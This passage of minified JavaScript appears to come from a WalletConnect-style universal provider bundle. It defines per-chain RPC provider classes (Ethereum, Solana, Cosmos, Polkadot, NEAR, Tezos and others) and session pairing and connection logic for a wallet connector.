r?DTe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,t8=(r,e)=>{for(var t in e||(e={}))jTe.call(e,t)&&PF(r,t,e[t]);if(NF)for(var t of NF(e))FTe.call(e,t)&&PF(r,t,e[t]);return r},qTe=(r,e)=>LTe(r,UTe(e));function fc(r,e,t){var i;const n=nw(r);return((i=e.rpcMap)==null?void 0:i[n.reference])||`${PX}?chainId=${n.namespace}:${n.reference}&projectId=${t}`}function a2(r){return r.includes(":")?r.split(":")[1]:r}function JX(r){return r.map(e=>`${e.split(":")[0]}:${e.split(":")[1]}`)}function zTe(r,e){const t=Object.keys(e.namespaces).filter(n=>n.includes(r));if(!t.length)return[];const i=[];return t.forEach(n=>{const s=e.namespaces[n].accounts;i.push(...s)}),i}function QS(r={},e={}){const t=$F(r),i=$F(e);return MTe(t,i)}function $F(r){var e,t,i,n;const s={};if(!Kv(r))return s;for(const[o,a]of Object.entries(r)){const c=mR(o)?[o]:a.chains,l=a.methods||[],u=a.events||[],d=a.rpcMap||{},h=i5(o);s[h]=qTe(t8(t8({},s[h]),a),{chains:o9(c,(e=s[h])==null?void 0:e.chains),methods:o9(l,(t=s[h])==null?void 0:t.methods),events:o9(u,(i=s[h])==null?void 0:i.events),rpcMap:t8(t8({},d),(n=s[h])==null?void 0:n.rpcMap)})}return s}function WTe(r){return r.includes(":")?r.split(":")[2]:r}function RF(r){const e={};for(const[t,i]of Object.entries(r)){const n=i.methods||[],s=i.events||[],o=i.accounts||[],a=mR(t)?[t]:i.chains?i.chains:JX(i.accounts);e[t]={chains:a,methods:n,events:s,accounts:o}}return e}function XS(r){return typeof r=="number"?r:r.includes("0x")?parseInt(r,16):(r=r.includes(":")?r.split(":")[1]:r,isNaN(Number(r))?r:Number(r))}const QX={},yi=r=>QX[r],eA=(r,e)=>{QX[r]=e};let HTe=class{constructor(e){this.name="polkadot",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=a2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||fc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,yi("disableProviderPing")))}};var VTe=Object.defineProperty,KTe=Object.defineProperties,GTe=Object.getOwnPropertyDescriptors,OF=Object.getOwnPropertySymbols,ZTe=Object.prototype.hasOwnProperty,YTe=Object.prototype.propertyIsEnumerable,BF=(r,e,t)=>e in r?VTe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,MF=(r,e)=>{for(var t in e||(e={}))ZTe.call(e,t)&&BF(r,t,e[t]);if(OF)for(var t of OF(e))YTe.call(e,t)&&BF(r,t,e[t]);return r},DF=(r,e)=>KTe(r,GTe(e));let JTe=class{constructor(e){this.name="eip155",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.httpProviders=this.createHttpProviders(),this.chainId=parseInt(this.getDefaultChain())}async request(e){switch(e.request.method){case"eth_requestAccounts":return this.getAccounts();case"eth_accounts":return this.getAccounts();case"wallet_switchEthereumChain":return await this.handleSwitchChain(e);case"eth_chainId":return parseInt(this.getDefaultChain());case"wallet_getCapabilities":return await this.getCapabilities(e);case"wallet_getCallsStatus":return await this.getCallStatus(e)}return this.namespace.methods.includes(e.request.method)?await this.client.request(e):this.getHttpProvider().request(e.request)}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(parseInt(e),t),this.chainId=parseInt(e),this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId.toString();if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}createHttpProvider(e,t){const i=t||fc(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,yi("disableProviderPing")))}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=parseInt(a2(t));e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}getHttpProvider(){const e=this.chainId,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}async handleSwitchChain(e){var t,i;let n=e.request.params?(t=e.request.params[0])==null?void 0:t.chainId:"0x0";n=n.startsWith("0x")?n:`0x${n}`;const s=parseInt(n,16);if(this.isChainApproved(s))this.setDefaultChain(`${s}`);else if(this.namespace.methods.includes("wallet_switchEthereumChain"))await this.client.request({topic:e.topic,request:{method:e.request.method,params:[{chainId:n}]},chainId:(i=this.namespace.chains)==null?void 0:i[0]}),this.setDefaultChain(`${s}`);else throw new Error(`Failed to switch to chain 'eip155:${s}'. The chain is not approved or the wallet does not support 'wallet_switchEthereumChain' method.`);return null}isChainApproved(e){return this.namespace.chains.includes(`${this.name}:${e}`)}async getCapabilities(e){var t,i,n;const s=(i=(t=e.request)==null?void 0:t.params)==null?void 0:i[0];if(!s)throw new Error("Missing address parameter in `wallet_getCapabilities` request");const o=this.client.session.get(e.topic),a=((n=o?.sessionProperties)==null?void 0:n.capabilities)||{};if(a!=null&&a[s])return a?.[s];const c=await this.client.request(e);try{await this.client.session.update(e.topic,{sessionProperties:DF(MF({},o.sessionProperties||{}),{capabilities:DF(MF({},a||{}),{[s]:c})})})}catch(l){console.warn("Failed to update session with capabilities",l)}return c}async getCallStatus(e){var t,i;const n=this.client.session.get(e.topic),s=(t=n.sessionProperties)==null?void 0:t.bundler_name;if(s){const a=this.getBundlerUrl(e.chainId,s);try{return await this.getUserOperationReceipt(a,e)}catch(c){console.warn("Failed to fetch call status from bundler",c,a)}}const o=(i=n.sessionProperties)==null?void 0:i.bundler_url;if(o)try{return await this.getUserOperationReceipt(o,e)}catch(a){console.warn("Failed to fetch call status from custom bundler",a,o)}if(this.namespace.methods.includes(e.request.method))return await this.client.request(e);throw new Error("Fetching call status not approved by the wallet.")}async getUserOperationReceipt(e,t){var i;const n=new URL(e),s=await fetch(n,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(jn("eth_getUserOperationReceipt",[(i=t.request.params)==null?void 0:i[0]]))});if(!s.ok)throw new Error(`Failed to fetch user operation receipt - ${s.status}`);return await s.json()}getBundlerUrl(e,t){return`${Xxe}?projectId=${this.client.core.projectId}&chainId=${e}&bundler=${t}`}},QTe=class{constructor(e){this.name="solana",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=a2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||fc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,yi("disableProviderPing")))}},XTe=class{constructor(e){this.name="cosmos",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=a2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||fc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,yi("disableProviderPing")))}},eke=class{constructor(e){this.name="algorand",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(!this.httpProviders[e]){const i=t||fc(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,i)}this.chainId=e,this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;e[t]=this.createHttpProvider(t,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||fc(e,this.namespace,this.client.core.projectId);return typeof i>"u"?void 0:new Vr(new li(i,yi("disableProviderPing")))}},tke=class{constructor(e){this.name="cip34",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{const i=this.getCardanoRPCUrl(t),n=a2(t);e[n]=this.createHttpProvider(n,i)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}getCardanoRPCUrl(e){const t=this.namespace.rpcMap;if(t)return t[e]}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||this.getCardanoRPCUrl(e);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,yi("disableProviderPing")))}},rke=class{constructor(e){this.name="elrond",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=a2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||fc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,yi("disableProviderPing")))}},ike=class{constructor(e){this.name="multiversx",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=a2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||fc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,yi("disableProviderPing")))}},nke=class{constructor(e){this.name="near",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(this.chainId=e,!this.httpProviders[e]){const i=t||fc(`${this.name}:${e}`,this.namespace);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,i)}this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;e[t]=this.createHttpProvider(t,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||fc(e,this.namespace);return typeof i>"u"?void 0:new Vr(new li(i,yi("disableProviderPing")))}},ske=class{constructor(e){this.name="tezos",this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(this.chainId=e,!this.httpProviders[e]){const i=t||fc(`${this.name}:${e}`,this.namespace);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,i)}this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{e[t]=this.createHttpProvider(t)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||fc(e,this.namespace);return typeof i>"u"?void 0:new Vr(new li(i))}},oke=class{constructor(e){this.name=Rm,this.namespace=e.namespace,this.events=yi("events"),this.client=yi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace.chains=[...new Set((this.namespace.chains||[]).concat(e.chains||[]))],this.namespace.accounts=[...new Set((this.namespace.accounts||[]).concat(e.accounts||[]))],this.namespace.methods=[...new Set((this.namespace.methods||[]).concat(e.methods||[]))],this.namespace.events=[...new Set((this.namespace.events||[]).concat(e.events||[]))],this.httpProviders=this.createHttpProviders()}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider(e.chainId).request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(vl.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){var e,t;const i={};return(t=(e=this.namespace)==null?void 0:e.accounts)==null||t.forEach(n=>{const s=nw(n);i[`${s.namespace}:${s.reference}`]=this.createHttpProvider(n)}),i}getHttpProvider(e){const t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||fc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,yi("disableProviderPing")))}};var ake=Object.defineProperty,cke=Object.defineProperties,lke=Object.getOwnPropertyDescriptors,LF=Object.getOwnPropertySymbols,uke=Object.prototype.hasOwnProperty,dke=Object.prototype.propertyIsEnumerable,UF=(r,e,t)=>e in r?ake(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,r8=(r,e)=>{for(var t in e||(e={}))uke.call(e,t)&&UF(r,t,e[t]);if(LF)for(var t of LF(e))dke.call(e,t)&&UF(r,t,e[t]);return r},tA=(r,e)=>cke(r,lke(e));let hke=class XX{constructor(e){this.events=new T0,this.rpcProviders={},this.shouldAbortPairingAttempt=!1,this.maxPairingAttempts=10,this.disableProviderPing=!1,this.providerOpts=e,this.logger=typeof e?.logger<"u"&&typeof e?.logger!="string"?e.logger:Iu(ra({level:e?.logger||uF})),this.disableProviderPing=e?.disableProviderPing||!1}static async init(e){const t=new XX(e);return await t.initialize(),t}async request(e,t,i){const[n,s]=this.validateChain(t);if(!this.session)throw new Error("Please call connect() before request()");return await this.getProvider(n).request({request:r8({},e),chainId:`${n}:${s}`,topic:this.session.topic,expiry:i})}sendAsync(e,t,i,n){const s=new Date().getTime();this.request(e,i,n).then(o=>t(null,bl(s,o))).catch(o=>t(o,void 0))}async enable(){if(!this.client)throw new Error("Sign Client not initialized");return this.session||await this.connect({namespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties}),await this.requestAccounts()}async disconnect(){var e;if(!this.session)throw new Error("Please call connect() before enable()");await this.client.disconnect({topic:(e=this.session)==null?void 0:e.topic,reason:Hi("USER_DISCONNECTED")}),await this.cleanup()}async connect(e){if(!this.client)throw new Error("Sign Client not initialized");if(this.setNamespaces(e),await this.cleanupPendingPairings(),!e.skipPairing)return await this.pair(e.pairingTopic)}async authenticate(e,t){if(!this.client)throw new Error("Sign Client not initialized");this.setNamespaces(e),await this.cleanupPendingPairings();const{uri:i,response:n}=await this.client.authenticate(e,t);i&&(this.uri=i,this.events.emit("display_uri",i));const s=await n();if(this.session=s.session,this.session){const o=RF(this.session.namespaces);this.namespaces=QS(this.namespaces,o),this.persist("namespaces",this.namespaces),this.onConnect()}return s}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}removeListener(e,t){this.events.removeListener(e,t)}off(e,t){this.events.off(e,t)}get isWalletConnect(){return!0}async pair(e){this.shouldAbortPairingAttempt=!1;let t=0;do{if(this.shouldAbortPairingAttempt)throw new Error("Pairing aborted");if(t>=this.maxPairingAttempts)throw new Error("Max auto pairing attempts reached");const{uri:i,approval:n}=await this.client.connect({pairingTopic:e,requiredNamespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties});i&&(this.uri=i,this.events.emit("display_uri",i)),await n().then(s=>{this.session=s;const o=RF(s.namespaces);this.namespaces=QS(this.namespaces,o),this.persist("namespaces",this.namespaces)}).catch(s=>{if(s.message!==kX)throw s;t++})}while(!this.session);return this.onConnect(),this.session}setDefaultChain(e,t){try{if(!this.session)return;const[i,n]=this.validateChain(e),s=this.getProvider(i);s.name===Rm?s.setDefaultChain(`${i}:${n}`,t):s.setDefaultChain(n,t)}catch(i){if(!/Please call connect/.test(i.message))throw i}}async cleanupPendingPairings(e={}){this.logger.info("Cleaning up inactive pairings...");const t=this.client.pairing.getAll();if(Pw(t)){for(const i of t)e.deletePairings?this.client.core.expirer.set(i.topic,0):await this.client.core.relayer.subscriber.unsubscribe(i.topic);this.logger.info(`Inactive pairings cleared: ${t.length}`)}}abortPairingAttempt(){this.shouldAbortPairingAttempt=!0}async checkStorage(){if(this.namespaces=await this.getFromStore("namespaces"),this.optionalNamespaces=await this.getFromStore("optionalNamespaces")||{},this.client.session.length){const e=this.client.session.keys.length-1;this.session=this.client.session.get(this.client.session.keys[e]),this.createProviders()}}async initialize(){this.logger.trace("Initialized"),await this.createClient(),await this.checkStorage(),this.registerEventListeners()}async createClient(){this.client=this.providerOpts.client||await jxe.init({core:this.providerOpts.core,logger:this.providerOpts.logger||uF,relayUrl:this.providerOpts.relayUrl||Yxe,projectId:this.providerOpts.projectId,metadata:this.providerOpts.metadata,storageOptions:this.providerOpts.storageOptions,storage:this.providerOpts.storage,name:this.providerOpts.name,customStoragePrefix:this.providerOpts.customStoragePrefix,telemetryEnabled:this.providerOpts.telemetryEnabled}),this.logger.trace("SignClient Initialized")}createProviders(){if(!this.client)throw new Error("Sign Client not initialized");if(!this.session)throw new Error("Session not initialized. Please call connect() before enable()");const e=[...new Set(Object.keys(this.session.namespaces).map(t=>i5(t)))];eA("client",this.client),eA("events",this.events),eA("disableProviderPing",this.disableProviderPing),e.forEach(t=>{if(!this.session)return;const i=zTe(t,this.session),n=JX(i),s=QS(this.namespaces,this.optionalNamespaces),o=tA(r8({},s[t]),{accounts:i,chains:n});switch(t){case"eip155":this.rpcProviders[t]=new JTe({namespace:o});break;case"algorand":this.rpcProviders[t]=new eke({namespace:o});break;case"solana":this.rpcProviders[t]=new QTe({namespace:o});break;case"cosmos":this.rpcProviders[t]=new XTe({namespace:o});break;case"polkadot":this.rpcProviders[t]=new HTe({namespace:o});break;case"cip34":this.rpcProviders[t]=new tke({namespace:o});break;case"elrond":this.rpcProviders[t]=new rke({namespace:o});break;case"multiversx":this.rpcProviders[t]=new ike({namespace:o});break;case"near":this.rpcProviders[t]=new nke({namespace:o});break;case"tezos":this.rpcProviders[t]=new ske({namespace:o});break;default:this.rpcProviders[Rm]?this.rpcProviders[Rm].updateNamespace(o):this.rpcProviders[Rm]=new oke({namespace:o})}})}registerEventListeners(){if(typeof this.client>"u")throw new Error("Sign Client is not initialized");this.client.on("session_ping",e=>{this.events.emit("session_ping",e)}),this.client.on("session_event",e=>{const{params:t}=e,{event:i}=t;if(i.name==="accountsChanged"){const n=i.data;n&&Pw(n)&&this.events.emit("accountsChanged",n.map(WTe))}else if(i.name==="chainChanged"){const n=t.chainId,s=t.event.data,o=i5(n),a=XS(n)!==XS(s)?`${o}:${XS(s)}`:n;this.onChainChanged(a)}else this.events.emit(i.name,i.data);this.events.emit("session_event",e)}),this.client.on("session_update",({topic:e,params:t})=>{var i;const{namespaces:n}=t,s=(i=this.client)==null?void 0:i.session.get(e);this.session=tA(r8({},s),{namespaces:n}),this.onSessionUpdate(),this.events.emit("session_update",{topic:e,params:t})}),this.client.on("session_delete",async e=>{await this.cleanup(),this.events.emit("session_delete",e),this.events.emit("disconnect",tA(r8({},Hi("USER_DISCONNECTED")),{data:e.topic}))}),this.on(vl.DEFAULT_CHAIN_CHANGED,e=>{this.onChainChanged(e,!0)})}getProvider(e){return this.rpcProviders[e]||this.rpcProviders[Rm]}onSessionUpdate(){Object.keys(this.rpcProviders).forEach(e=>{var t;this.getProvider(e).updateNamespace((t=this.session)==null?void 0:t.namespaces[e])})}setNamespaces(e){const{namespaces:t,optionalNamespaces:i,sessionProperties:n}=e;t&&Object.keys(t).length&&(this.namespaces=t),i&&Object.keys(i).length&&(this.optionalNamespaces=i),this.sessionProperties=n,this.persist("namespaces",t),this.persist("optionalNamespaces",i)}validateChain(e){const[t,i]=e?.split(":")||["",""];if(!this.namespaces||!Object.keys(this.namespaces).length)return[t,i];if(t&&!Object.keys(this.namespaces||{}).map(o=>i5(o)).includes(t))throw new Error(`Namespace '${t}' is not configured. Please call connect() first with namespace config.`);if(t&&i)return[t,i];const n=i5(Object.keys(this.namespaces)[0]),s=this.rpcProviders[n].getDefaultChain();return[n,s]}async requestAccounts(){const[e]=this.validateChain();return await this.getProvider(e).requestAccounts()}onChainChanged(e,t=!1){if(!this.namespaces)return;const[i,n]=this.validateChain(e);n&&(t||this.getProvider(i).setDefaultChain(n),this.namespaces[i]?this.namespaces[i].defaultChain=n:this.namespaces[`${i}:${n}`]?this.namespaces[`${i}:${n}`].defaultChain=n:this.namespaces[`${i}:${n}`]={defaultChain:n},this.persist("namespaces",this.namespaces),this.events.emit("chainChanged",n))}onConnect(){this.createProviders(),this.events.emit("connect",{session:this.session})}async 